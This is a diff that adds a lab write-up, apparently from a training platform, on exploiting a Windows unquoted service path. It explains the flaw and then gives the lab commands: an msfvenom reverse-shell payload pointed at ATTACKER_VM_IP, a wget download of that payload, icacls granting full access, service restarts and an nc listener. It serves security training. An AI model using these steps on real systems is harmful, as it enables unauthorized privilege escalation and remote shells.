@@ -1,1 +1,80 @@
+#Objective
 
+Exploit an Unquoted Service Path vulnerability to execute a malicious payload with privileged access.
+
+#Explanation of the Vulnerability
+
+When a Windows service has an unquoted path that contains spaces, the operating system may search for the executable incorrectly.
+Instead of reading the full path as one file, Windows tries to interpret it word by word.
+
+For example, if the service path is:
+
+C:\Program Files\Disk Service\disk 11.exe
+
+
+the system may search in this order:
+
+C:\Program.exe  
+C:\Program Files\Disk.exe  
+C:\Program Files\Disk Service\disk 11.exe
+
+
+If an attacker can place a malicious file such as Disk.exe in one of these locations, it will be executed before the legitimate service binary.
+
+#Exploitation Steps in This Lab
+-Create a malicious payload
+
+Generated a reverse TCP shell using msfvenom to execute on the target machine.
+We can use this command:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_VM_IP LPORT=4446 -f exe-service -o Disk.exe
+
+- Transfer the payload to the target
+
+Started an HTTP server on the attacker machine using the command:
+
+python3 -m http.server
+
+
+Downloaded the file on the victim using wget:
+
+wget http://ATTACKER_VM_IP:8000/Disk.exe -O Disk.exe
+
+- Place the payload in the vulnerable path
+
+Copied the malicious executable to the folder used by the vulnerable service with:
+
+move C:\Users\thm-unpriv\Disk.exe C:\MyPrograms\Disk.exe
+
+
+- Modified permissions to allow execution by all users with:
+
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+
+- Trigger the vulnerability
+
+Restarted the vulnerable service.
+
+In CMD we stopped it with:
+
+sc stop "disk sorter enterprise"
+
+
+and started it with:
+
+sc start "disk sorter enterprise"
+
+
+!!If we are using PowerShell, we should replace sc by sc.exe.
+
+The system executed the attacker’s file instead of the legitimate one, giving a reverse shell on the attacker machine.
+We executed:
+
+nc -nlvp 4446
+
+
+on our attacking VM and waited for the file to be executed, or executed it ourselves.
+
+!!!!Important Condition
+
+The attacker must have write permissions on the directory where the service executable is located in order to place the malicious file.
